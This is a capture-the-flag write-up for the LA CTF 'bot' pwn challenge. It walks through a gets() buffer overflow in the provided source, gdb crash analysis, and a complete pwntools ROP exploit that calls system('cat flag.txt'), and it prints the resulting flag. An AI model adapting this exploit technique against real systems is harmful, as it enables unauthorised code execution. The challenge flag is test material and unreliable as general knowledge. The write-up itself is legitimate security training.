# bot (pwn) by kaiphait  

We got a Dockerfile, a libc, a linker, a binary and the source code,
which is why my first thought was a ret2libc attack but it turned out that was not necessary.

First I checked the file and its mitigations:
```
file ./bot

bot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=1ed799aea3b8082b9dadde68dd67684e6101badc, for GNU/Linux 3.2.0, with debug_info, not stripped
--
checksec --file ./bot

Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
It is a 64-bit binary with NX enabled so it won't be possible to just execute shellcode on the stack.

When the binary is executed it prints:
```
hi, how can i help?
```
and waits for an input.

### Source Code:  
Since the source code was given I had a look at that:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void) {
  setbuf(stdout, NULL);
  char input[64];
  volatile int give_flag = 0;
  puts("hi, how can i help?");
  gets(input);
  if (strcmp(input, "give me the flag") == 0) {
    puts("lol no");
  } else if (strcmp(input, "please give me the flag") == 0) {
    puts("no");
  } else if (strcmp(input, "help, i have no idea how to solve this") == 0) {
    puts("L");
  } else if (strcmp(input, "may i have the flag?") == 0) {
    puts("not with that attitude");
  } else if (strcmp(input, "please please please give me the flag") == 0) {
    puts("i'll consider it");
    sleep(15);
    if (give_flag) {
      puts("ok here's your flag");
      system("cat flag.txt");
    } else {
      puts("no");
    }
  } else {
    puts("sorry, i didn't understand your question");
    exit(1);
  }
}
```

Looking at how the binary gets its input, it's apparently vulnerable to a buffer overflow.
First I built a little script to generate test-payloads:
```
from pwn import *
import sys

junk = cyclic(200)

sys.stdout.buffer.write(junk)
```
```
python fuzzer.py > test
--
gdb bot
--
b main
--
r < test

```

But when I executed the binary with gdb, it did not cause the binary to crash since it exits
when an input does not equal any of the strings in the source code.

My second try looked like:
```
from pwn import *
import sys

junk = cyclic(200)
prefix = b"give me the flag\0"

sys.stdout.buffer.write(prefix + junk)
```
In order to get the binary to not exit but still overflow the buffer, I added a "valid" input, ending in a nullbyte.
Which then did overwrite rsp:
```
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7e8fa37  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x00007fffffffdf08  →  "aoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabb[...]"
$rbp   : 0x61616e6161616d61 ("amaaanaa"?)
$rsi   : 0x1               
$rdi   : 0x00007ffff7f96a70  →  0x0000000000000000
$rip   : 0x00000000004012d2  →  <main+336> ret 
$r8    : 0x6               
$r9    : 0x0               
$r10   : 0x00007ffff7d84360  →  0x000f001a00007b95
$r11   : 0x246             
$r12   : 0x00007fffffffe018  →  0x00007fffffffe360  →  "/home/.../ctf/lactf/bot/bot"
$r13   : 0x0000000000401182  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf08│+0x0000: "aoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabb[...]"	 ← $rsp
0x00007fffffffdf10│+0x0008: "aqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabd[...]"
0x00007fffffffdf18│+0x0010: "asaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabf[...]"
0x00007fffffffdf20│+0x0018: "auaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabh[...]"
0x00007fffffffdf28│+0x0020: "awaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj[...]"
0x00007fffffffdf30│+0x0028: "ayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabl[...]"
0x00007fffffffdf38│+0x0030: "bbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabn[...]"
0x00007fffffffdf40│+0x0038: "bdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabp[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4012c7 <main+325>       call   0x401080 <exit@plt>
     0x4012cc <main+330>       mov    eax, 0x0
     0x4012d1 <main+335>       leave  
 →   0x4012d2 <main+336>       ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:bot.c+33 ────
     28	     }
     29	   } else {
     30	     puts("sorry, i didn't understand your question");
     31	     exit(1);
     32	   }
 →   33	 }
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bot", stopped 0x4012d2 in main (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4012d2 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  Quit
gef➤  
```
## Exploit Script:
After I found a way to overwrite rsp I started writing my script: 
(note that the exploit is written manually and much could be automated like the finding of gadgets and symbols)
```
from pwn import *

binary = "./bot"

#proc = remote("lac.tf", 31180)

proc = process(binary)
#gdb.attach(proc) # for debugging

system = p64(0x401050) # Read from ghidra
pop_rdi = p64(0x40133b) # ROPgadget --binary bot | grep "pop rdi"
cat_flag = p64(0x4020f3) # Read from ghidra
addr_of_main = p64(0x401182) # readelf -s ./bot | grep main
ret_addr = p64(0x40133b + 1) # ret address for stack alignment

prefix = b"give me the flag\0"
junk = prefix + cyclic(cyclic_find("aoaa")) # "aoaa" from previous test with testpayload

# overflow buffer
payload = junk

# put the string "cat flag.txt" into rdi
payload += pop_rdi
payload += cat_flag

# ret for stack alignment
payload += ret_addr

# call system with rdi being "cat flag.txt"
payload += system

# return to main so the binary does not just crash
payload += addr_of_main

# send payload to binary
proc.sendlineafter("help?", payload)
#text = proc.recvline()
#log.info(text.decode("utf-8"))

proc.interactive()
```
In order to get all the addresses manually I threw the binary into ghidra and read some addresses from there.

### Executing:
```
[+] Opening connection to lac.tf on port 31180: Done
/home/.../.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:823: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode

lol no
lactf{hey_stop_bullying_my_bot_thats_not_nice}
hi, how can i help?
$  
```
It was a fun challenge, thanks!

